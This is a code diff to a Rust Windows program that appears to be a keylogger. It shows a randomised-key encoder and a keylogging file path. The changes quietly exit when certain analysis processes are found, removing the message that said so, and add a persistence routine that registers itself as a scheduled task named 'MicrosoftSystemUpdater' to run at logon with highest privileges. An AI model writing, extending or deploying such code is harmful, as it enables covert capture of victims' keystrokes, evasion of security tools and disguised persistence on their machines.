@@ -61,6 +61,7 @@ use windows::Win32::System::Diagnostics::ToolHelp::{
 };
 
 // creates a global encoder
+//randomizes key
 static ENCODER: Lazy<Mutex<encode::Encode>> = Lazy::new(|| Mutex::new(Encode::new( StdRng::from_os_rng().r#gen())));
 
 static KEYLOGGING_FILE: Lazy<PathBuf> = Lazy::new(|| {
@@ -272,17 +273,16 @@ pub fn check_for_process(){
         let mut pe32 = PROCESSENTRY32::default();
         pe32.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
 
-        // Get first process
+        // checks for running process
         if Process32First(snapshot, &mut pe32).is_ok() {
             loop {
                 num_process += 1;
                 // Convert process name from WCHAR to Rust String
-                let process_name = ansi_to_string(&pe32.szExeFile);
+                let process_name = ansi_to_string(&pe32.szExeFile).to_lowercase();
 
                 // println!("Process ID: {}, Name: {}", pe32.th32ProcessID, process_name);
 
                 if warry_process.contains(&process_name.as_str()){
-                    println!("Found process that are bad: {}", process_name);
                     process::exit(1);
                 }
 
@@ -308,4 +308,22 @@ fn ansi_to_string(bytes: &[i8]) -> String {
     let u8_slice = &bytes[..nul_pos];
     let u8_slice = u8_slice.iter().map(|&b| b as u8).collect::<Vec<u8>>();
     String::from_utf8_lossy(&u8_slice).to_string()
+}
+
+pub fn add_sheduled_task(){
+    let task_name = "MicrosoftSystemUpdater";
+    let task_path = std::env::current_exe().expect("Can't find");
+
+        let output = std::process::Command::new("schtasks")
+        .args(&[
+            "/Create",
+            "/SC", "ONLOGON",                    // triggers quietly on user login
+            "/TN", task_name,
+            "/TR", task_path.to_str().unwrap(),
+            "/RL", "HIGHEST",                    // run with admin rights
+            "/F",                                // force create
+        ])
+        .output()
+        .expect("failed to run schtasks");
+
 }
